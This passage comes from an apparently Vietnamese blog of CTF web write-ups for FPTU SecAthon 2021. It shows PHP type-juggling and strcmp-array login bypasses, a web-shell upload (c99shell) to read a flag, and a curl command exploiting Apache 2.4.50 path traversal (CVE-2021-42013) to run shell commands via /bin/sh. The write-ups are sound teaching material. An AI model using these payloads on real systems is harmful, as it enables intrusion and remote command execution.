    <p>Nh∆∞ v·∫≠y, password ph·∫£i b·∫Øt ƒë·∫ßu b·∫±ng <code class="language-plaintext highlighter-rouge">8</code> v√† c√≥ m√£ hash SHA256 b·∫Øt ƒë·∫ßu b·∫±ng <code class="language-plaintext highlighter-rouge">"0e"</code>, theo link ·ªü tr√™n, m√¨nh t√¨m ƒë∆∞·ª£c m√£ n√†y:</p>

    <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  8W-vW:5ghashcat:0e99625202804787226908207582077273485674961623832383874594371630 (note: the plaintext has a colon in the middle)
</code></pre></div>    </div>
  </li>
  <li>
    <p>Nh∆∞ v·∫≠y password s·∫Ω l√† <code class="language-plaintext highlighter-rouge">8W-vW:5ghashcat</code></p>
  </li>
  <li>
    <p>Ti·∫øp ƒë·∫øn 2 ƒëi·ªÅu ki·ªán c√≤n l·∫°i c·ªßa d√≤ng 6: <code class="language-plaintext highlighter-rouge">strcmp("ahihi", $usr) == 0 &amp;&amp; $usr != "ahihi"</code> :D ???</p>
  </li>
  <li>
    <p>M·ªõi ƒë·∫ßu ƒë·ªçc m√¨nh c≈©ng h∆°i b·ªã l√∫ t√≠, l√†m th·∫ø n√†o m√† <code class="language-plaintext highlighter-rouge">strcmp</code> th√¨ tr·∫£ v·ªÅ 0 (gi·ªëng nhau) m√† ƒë·∫±ng sau l·∫°i kh√°c nhau cho ƒë∆∞·ª£c :D ???, nh∆∞ng, c√≥ m·ªôt ƒëi·ªÅu v·ªÅ <code class="language-plaintext highlighter-rouge">strcmp</code> trong PHP, hay n√≥i ƒë√∫ng h∆°n l√† c√°i <code class="language-plaintext highlighter-rouge">==</code> ch·∫øt ti·ªát c·ªßa PHP:</p>

    <ul>
      <li>
        <p>Trong PHP, khi so s√°nh <code class="language-plaintext highlighter-rouge">NULL == 0</code> th√¨ s·∫Ω tr·∫£ v·ªÅ true :D ??? Kh√¥ng ƒë√πa ƒë√¢u, n√≥ tr·∫£ v·ªÅ true th·∫≠t :&gt; ƒê·ªçc th√™m t·∫°i <a href="https://www.php.net/manual/en/types.comparisons.php">ƒë√¢y</a></p>
      </li>
      <li>
        <p>C√≥ m·ªôt c√°ch ƒë·ªÉ khi·∫øn <code class="language-plaintext highlighter-rouge">strcmp</code> tr·∫£ v·ªÅ <code class="language-plaintext highlighter-rouge">NULL</code>, ƒë√≥ l√† so s√°nh <code class="language-plaintext highlighter-rouge">Array</code> v√† <code class="language-plaintext highlighter-rouge">String</code> :&gt; H√£y ƒë·ªçc th√™m t·∫°i <a href="https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016">ƒë√¢y</a></p>
      </li>
    </ul>
  </li>
  <li>
    <p>Nh∆∞ v·∫≠y ƒëi·ªÅu ta c·∫ßn l√† nh·∫≠p username d∆∞·ªõi d·∫°ng <code class="language-plaintext highlighter-rouge">Array</code>, but how to do that?</p>
  </li>
  <li>
    <p>ƒê·ªÉ √Ω ƒë·∫øn source code form c·ªßa username: <code class="language-plaintext highlighter-rouge">&lt;input type="text" name="username"&gt;</code>, ta th·∫•y khi submit, query string s·∫Ω c√≥ d·∫°ng <code class="language-plaintext highlighter-rouge">?username=anything&amp;password=anything</code> ƒë√∫ng kh√¥ng? V·∫≠y mu·ªën ƒë·ªïi t·ª´ <code class="language-plaintext highlighter-rouge">?username=</code> sang <code class="language-plaintext highlighter-rouge">?username[]=</code> th√¨ ƒë∆°n gi·∫£n ta ch·ªâ c·∫ßn s·ª≠a l·∫°i code HTML c·ªßa username form th√†nh <code class="language-plaintext highlighter-rouge">&lt;input type="text" name="username[]"&gt;</code></p>
  </li>
  <li>
    <p>B√¢y gi·ªù ti·∫øn h√†nh nh·∫≠p username (m√¨nh ƒë·ªÉ <code class="language-plaintext highlighter-rouge">ahihi</code> cho theo √Ω th√≠ch c·ªßa ng∆∞·ªùi ra ƒë·ªÅ :&gt;) v√† password <code class="language-plaintext highlighter-rouge">8W-vW:5ghashcat</code> v√† ƒë√¢y l√† k·∫øt qu·∫£:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/IAW302_4.png" alt="login" /></p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/IAW302_5.png" alt="success" /></p>
  </li>
  <li>
    <p>Ta ƒë√£ v√†o ƒë∆∞·ª£c trang <code class="language-plaintext highlighter-rouge">chall.php</code> ƒë√∫ng nh∆∞ ƒëi·ªÅu ki·ªán c·ªßa back-end PHP ·ªü tr√™n, Ctrl U ƒë·ªÉ xem source code n√†o:</p>
  </li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])){</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'size'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1048576</span><span class="p">){</span>
        <span class="nv">$errors</span><span class="o">=</span><span class="s1">'File size must be excately 1 MB'</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$errors</span><span class="p">)</span><span class="o">==</span><span class="kc">true</span><span class="p">){</span>
    <span class="nv">$up</span> <span class="o">=</span> <span class="s2">"uploads/"</span><span class="mf">.</span><span class="nb">rand</span><span class="p">()</span><span class="mf">.</span><span class="s2">"."</span><span class="mf">.</span><span class="nb">explode</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">])[</span><span class="mi">1</span><span class="p">];</span>
    <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span><span class="nv">$up</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">"File uploaded successfully</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">'&lt;p&gt;&lt;a href='</span><span class="mf">.</span> <span class="nv">$up</span> <span class="mf">.</span><span class="s1">' target="_blank"&gt;File&lt;/a&gt;&lt;/p&gt;'</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">echo</span> <span class="nv">$errors</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>
    <p>ƒê√¢y l√† source code PHP cho ph·∫ßn upload file, c√≥ th·ªÉ th·∫•y ta c√≥ th·ªÉ upload b·∫•t c·ª© file g√¨, mi·ªÖn l√† ƒë·ª´ng v∆∞·ª£t qu√° <code class="language-plaintext highlighter-rouge">1048576 bytes</code> l√† ƒë∆∞·ª£c</p>
  </li>
  <li>
    <p>M√¨nh s·ª≠ d·ª•ng m·ªôt file c√≥ t√™n l√† <a href="https://github.com/KaizenLouie/C99Shell-PHP7">c99shell.php</a> ƒë·ªÉ upload, truy c·∫≠p v√†o file v√† ta c√≥ to√†n b·ªô file ƒë∆∞·ª£c upload l√™n :v</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/IAW302_6.png" alt="c99shell" /></p>
  </li>
  <li>
    <p>Lul, c√≥ v·∫ª flag kh√¥ng c√≥ ·ªü ƒë√¢y, v√† n·∫øu ƒë·ªÉ √Ω th√¨ t·∫•t c·∫£ file ƒë·ªÅu ch·ªâ c√≥ quy·ªÅn <code class="language-plaintext highlighter-rouge">read</code> m√† th√¥i :v nh∆∞ v·∫≠y m√¨nh kh√¥ng th·ªÉ d√πng command r·ªìi :v m√¨nh th·ª≠ truy c·∫≠p v√†o th∆∞ m·ª•c cha c·ªßa th∆∞ m·ª•c hi·ªán t·∫°i, v√† m√¨nh th·∫•y file n√†y:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/IAW302_7.png" alt="c99shell_2" /></p>
  </li>
  <li>
    <p>Th·ª≠ d√πng path traversal ƒë·ªÉ m·ªü file <code class="language-plaintext highlighter-rouge">fl@@@g_1337_ahiahi.txt</code> xem sao :v</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/IAW302_8.png" alt="flag" /></p>
  </li>
  <li>
    <p>V·∫≠y l√† ƒë√£ c√≥ flag: <code class="language-plaintext highlighter-rouge">FUSec{Mu·ªën gi·∫øt m·ªôt con r·ªìng, m√°u ph·∫£i ch·∫£y th√†nh s√¥ng_Tai n·∫°n qu√°, kh√¥ng sao, winable, winable guys}</code></p>
  </li>
</ul>

<blockquote>
  <p>M·ªôt b√†i kh√° d√†i h∆°i, flag n√†y ch·∫£ tr√°ch √¥ng anh T gi·∫•u t√™n c·ª© nh·∫Øc ƒë·∫øn ‚ÄúK·∫ª gi·∫øt r·ªìng‚Äù :))</p>
</blockquote>

<ul>
  <li>
    <p>C√≥ m·ªôt c√°ch ƒë∆°n gi·∫£n, m√† hay ho h∆°n ƒë·ªÉ l√†m b√†i n√†y</p>
  </li>
  <li>
    <p>ƒê·∫ßu ti√™n, chu·∫©n b·ªã 1 file PHP nh∆∞ sau:</p>

    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="cp">&lt;?php</span>
      <span class="nb">phpinfo</span><span class="p">();</span>
  <span class="cp">?&gt;</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>T√¨m <code class="language-plaintext highlighter-rouge">disable_functions</code>, thu ƒë∆∞·ª£c danh s√°ch c√°c funcion b·ªã ch·∫∑n:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/IAW302_9.png" alt="phpinfo" /></p>
  </li>
  <li>
    <p>Nh∆∞ v·∫≠y, r·∫•t nhi·ªÅu function li√™n quan ƒë·∫øn command v√† file handling b·ªã ch·∫∑n, nh∆∞ng c√≥ 2 h√†m kh√¥ng b·ªã ch·∫∑n: <code class="language-plaintext highlighter-rouge">dir</code> v√† <code class="language-plaintext highlighter-rouge">include</code></p>
  </li>
  <li>
    <p>ƒê·∫ßu ti√™n c·∫ßn list file:</p>

    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="cp">&lt;?php</span>
      <span class="nv">$cur</span> <span class="o">=</span> <span class="nb">dir</span><span class="p">(</span><span class="s2">"."</span><span class="p">);</span>
      <span class="nv">$par</span> <span class="o">=</span> <span class="nb">dir</span><span class="p">(</span><span class="s2">".."</span><span class="p">);</span>

      <span class="k">echo</span> <span class="s2">"Current:&lt;br&gt;"</span><span class="p">;</span>
      <span class="k">while</span> <span class="p">((</span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$cur</span><span class="o">-&gt;</span><span class="nf">read</span><span class="p">())</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>
      <span class="k">echo</span> <span class="s2">"filename: "</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
      <span class="p">}</span> 

      <span class="k">echo</span> <span class="s2">"Parent:&lt;br&gt;"</span><span class="p">;</span>
      <span class="k">while</span> <span class="p">((</span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$par</span><span class="o">-&gt;</span><span class="nf">read</span><span class="p">())</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>
      <span class="k">echo</span> <span class="s2">"filename: "</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
      <span class="p">}</span> 
      <span class="nv">$cur</span><span class="o">-&gt;</span><span class="nf">close</span><span class="p">();</span>
      <span class="nv">$par</span><span class="o">-&gt;</span><span class="nf">close</span><span class="p">();</span>
  <span class="cp">?&gt;</span> 
</code></pre></div>    </div>
  </li>
  <li>
    <p>Upload l√™n v√† m·ªü file, thu ƒë∆∞·ª£c danh s√°ch file trong th∆∞ m·ª•c hi·ªán t·∫°i v√† th∆∞ m·ª•c cha, ƒë·ªÉ √Ω th·∫•y trong th∆∞ m·ª•c cha c√≥ file <code class="language-plaintext highlighter-rouge">fl@@@g_1337_ahiahi.txt</code>, ƒë·∫øn ƒë√¢y th√¨ path traversal c≈©ng ƒë∆∞·ª£c, t·∫°o file PHP c≈©ng ƒë∆∞·ª£c:</p>

    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="cp">&lt;?php</span>
      <span class="k">echo</span> <span class="s2">"&lt;p&gt;"</span><span class="p">;</span>
      <span class="k">include</span> <span class="s1">'../fl@@@g_1337_ahiahi.txt'</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">"&lt;/p&gt;"</span><span class="p">;</span>
  <span class="cp">?&gt;</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>D√π l√† c√°ch n√†o th√¨ cu·ªëi c√πng c≈©ng thu ƒë∆∞·ª£c flag:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/IAW302_10.png" alt="flag" /></p>
  </li>
</ul>]]></content><author><name></name></author><summary type="html"><![CDATA[IAW302]]></summary></entry><entry><title type="html">FPTU SecAthon 2021 | Web Writeup | IAW301</title><link href="/2021/10/09/FuSec4-IAW301.html" rel="alternate" type="text/html" title="FPTU SecAthon 2021 | Web Writeup | IAW301" /><published>2021-10-09T13:30:00+00:00</published><updated>2021-10-09T13:30:00+00:00</updated><id>/2021/10/09/FuSec4-IAW301</id><content type="html" xml:base="/2021/10/09/FuSec4-IAW301.html"><![CDATA[<h1 id="iaw301">IAW301</h1>

<blockquote>
  <p>ƒê√¢y l√† m·ªôt challenge d·ªÖ, nh∆∞ng th·∫≠t ti·∫øc v√¨ m√¨nh l√∫ n√™n ƒë√£ g√µ sai m·ªôt k√≠ t·ª± trong payload m√† kh√¥ng bi·∫øt :‚Äô(
Xin √∫p m·∫∑t v√†o t∆∞·ªùng ƒë·ªÉ t·ª± ki·ªÉm ƒëi·ªÉm :‚Äô(</p>
</blockquote>

<ul>
  <li>B·∫Øt ƒë·∫ßu v·ªõi challenge, ta ƒë∆∞·ª£c cung c·∫•p 2 d·ªØ li·ªáu, file httpd.conf, v√† g·ª£i √Ω v·ªÅ flag:</li>
</ul>

<p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/762f1031aac218fa44bc2100116170a9e6fe8dbc/img/IAW301_1.png" alt="hints" /></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">httpd.conf</code> l√† file config c·ªßa Apache Server, truy c·∫≠p v√†o file theo ƒë∆∞·ªùng d·∫´n, m√¨nh nh·∫≠n th·∫•y c√≥ m·ªôt s·ªë th·ª© hay ho:</li>
</ul>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;Directory "/usr/local/apache2/cgi-bin"&gt;
    AllowOverride None
    Options None
    Require all granted
&lt;/Directory&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>Trong th·ªùi gian g·∫ßn ƒë√¢y, c√≥ 2 CVE n·ªïi ti·∫øng li√™n quan ƒë·∫øn 2 phi√™n b·∫£n c·ªßa Apache v√† <code class="language-plaintext highlighter-rouge">cgi-bin</code> c·ªßa n√≥, ƒë√≥ l√† <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773">CVE-2021-41773</a> (Apache 2.4.49) v√† <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42013">CVE-2021-42013</a> (Apache 2.4.50), ƒë·∫∑c ƒëi·ªÉm chung l√† l·ªói trong vi·ªác normalize path ·ªü file <code class="language-plaintext highlighter-rouge">util.c</code> khi·∫øn tin t·∫∑c c√≥ th·ªÉ s·ª≠ d·ª•ng <code class="language-plaintext highlighter-rouge">path traversal</code> v·ªõi payload th∆∞·ªùng th·∫•y l√† <code class="language-plaintext highlighter-rouge">/cgi-bin/../../../etc.passwd</code>, nh∆∞ng, v√¨ <code class="language-plaintext highlighter-rouge">util.c</code> ƒë√£ check d·∫•u <code class="language-plaintext highlighter-rouge">.</code> khi normalize path, n√™n ch√∫ng ta s·∫Ω c·∫ßn d√πng t·ªõi nh·ªØng payload ƒë∆∞·ª£c encode nh∆∞ <code class="language-plaintext highlighter-rouge">/.%2e/</code> thay cho <code class="language-plaintext highlighter-rouge">/../</code>.</p>
  </li>
  <li>
    <p>T·∫•t nhi√™n, gi·ªØa 2 CVE k·ªÉ tr√™n c√≥ s·ª± kh√°c nhau trong payload, v√¨ v·∫≠y ch√∫ng ta c·∫ßn check xem Apache ƒë√≥ thu·ªôc phi√™n b·∫£n n√†o (n·∫øu &gt; 2.4.50 th√¨ ki·∫øp n√†y coi nh∆∞ b·ªè :‚Äô()</p>
  </li>
  <li>
    <p>M√¨nh th·ª≠ check v·ªõi c√¢u l·ªánh <code class="language-plaintext highlighter-rouge">nmap</code> ƒë∆°n gi·∫£n sau:</p>

    <p><code class="language-plaintext highlighter-rouge">nmap -A -p8889 139.180.208.121 -vvv</code></p>

    <p>V√† c√≥ ƒë∆∞·ª£c k·∫øt qu·∫£:</p>

    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  PORT     STATE SERVICE REASON  VERSION
  8889/tcp open  http    syn-ack Apache httpd 2.4.50 <span class="o">((</span>Unix<span class="o">))</span>
  | http-methods: 
  |   Supported Methods: HEAD GET POST OPTIONS TRACE
  |_  Potentially risky methods: TRACE
  |_http-title: Site doesn<span class="s1">'t have a title (text/html).
  |_http-server-header: Apache/2.4.50 (Unix)
</span></code></pre></div>    </div>
  </li>
  <li>
    <p>Nh∆∞ v·∫≠y l√† Apache 2.4.50, ta c√≥ th·ªÉ d√πng <code class="language-plaintext highlighter-rouge">%%32%65%%32%65/</code> ho·∫∑c <code class="language-plaintext highlighter-rouge">.%%32%65/</code> thay th·∫ø cho <code class="language-plaintext highlighter-rouge">../</code></p>
  </li>
  <li>
    <p>C√≥ m·ªôt l∆∞u √Ω l√† khi ƒë·ªçc <code class="language-plaintext highlighter-rouge">httpd.conf</code>, h√£y ƒë·ªÉ √Ω ƒë·∫øn d√≤ng <code class="language-plaintext highlighter-rouge">ScriptAlias</code> ƒë·ªÉ bi·∫øt li·ªáu c√≥ alias n√†o thay cho <code class="language-plaintext highlighter-rouge">cgi-bin</code> kh√¥ng, v√≠ d·ª• nh∆∞ trong b√†i n√†y:</p>

    <p><code class="language-plaintext highlighter-rouge">ScriptAlias /nothingspecial/ "/usr/local/apache2/cgi-bin/"</code></p>
  </li>
  <li>
    <p>V√† ƒë·ªÉ √Ω <code class="language-plaintext highlighter-rouge">DocumentRoot</code> nh∆∞ trong b√†i:</p>

    <p><code class="language-plaintext highlighter-rouge">DocumentRoot "/usr/local/apache2/htdocs"</code></p>
  </li>
  <li>
    <p>Nh∆∞ v·∫≠y ƒë·ªÉ truy c·∫≠p ƒë∆∞·ª£c <code class="language-plaintext highlighter-rouge">/</code> th√¨ ta c·∫ßn 4 c·∫∑p <code class="language-plaintext highlighter-rouge">../</code>, thay th·∫ø alias v√† 2 c√°ch encode ƒë√£ k·ªÉ tr√™n, ta c√≥ payload:</p>

    <p><code class="language-plaintext highlighter-rouge">/nothingspecial/.%%32%65/.%%32%65/.%%32%65/.%%32%65/flag</code></p>
  </li>
  <li>
    <p>Nh∆∞ng, nh∆∞ v·∫≠y li·ªáu c√≥ ƒë√∫ng? Th·ª≠ v·ªõi <code class="language-plaintext highlighter-rouge">curl</code> v√† ƒë√¢y l√† k·∫øt qu·∫£:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/762f1031aac218fa44bc2100116170a9e6fe8dbc/img/IAW301_2.png" alt="IAW301_2" /></p>
  </li>
  <li>
    <p>Th·ª±c t·∫ø c√≥ m·ªôt c√°ch kh√°c, ta s·∫Ω d√πng ƒë·∫øn <code class="language-plaintext highlighter-rouge">/bin/sh</code> v√† option <code class="language-plaintext highlighter-rouge">--data</code> c·ªßa <code class="language-plaintext highlighter-rouge">curl</code> ƒë·ªÉ m·ªü file, ƒë∆°n gi·∫£n nh∆∞ sau:</p>

    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl <span class="s1">'http://139.180.208.121:8889/nothingspecial/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'</span> <span class="nt">--data</span> <span class="s1">'echo; cat ../flag'</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>V√† ƒë√¢y l√† k·∫øt qu·∫£:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/762f1031aac218fa44bc2100116170a9e6fe8dbc/img/IAW301_1.png" alt="IAW301_3" /></p>
  </li>
  <li>
    <p>Flag: <code class="language-plaintext highlighter-rouge">FUSEC{970c5c12bc41fd2783748e73fccf99b0}</code></p>
  </li>
</ul>

<blockquote>
  <p>Xin l·ªói c·∫£ team noname v√¨ m·ª° ƒë·∫øn mi·ªáng r·ªìi m√† ƒë·ªÉ tu·ªôt m·∫•t v√¨ m·ªôt d·∫•u % th·ª´a :‚Äô(</p>
</blockquote>]]></content><author><name></name></author><summary type="html"><![CDATA[IAW301]]></summary></entry></feed>